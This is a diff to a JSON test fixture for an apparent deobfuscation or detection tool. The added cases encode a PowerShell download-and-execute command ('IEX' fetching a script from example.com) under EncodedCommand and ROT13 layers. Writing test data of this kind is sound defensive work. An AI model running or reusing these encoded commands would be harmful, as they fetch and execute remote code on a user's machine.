@@ -34,5 +34,17 @@
     "payload": "eJzzdI1QyCgpKbDS10+tSMwtyEnVS87P1U/UKyg2BACI3wmK",
     "expected": "IEX http://example.com/a.ps1",
     "layer_prefix": "Base64 -> ZLIB"
+  },
+  {
+    "name": "encodedcommand_explicit_missing_padding",
+    "payload": "powershell -EncodedCommand SQBFAFgAIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQA",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "EncodedCommand"
+  },
+  {
+    "name": "rot13_powershell",
+    "payload": "VRK uggc://rknzcyr.pbz/n.cf1",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "ROT13"
   }
 ]
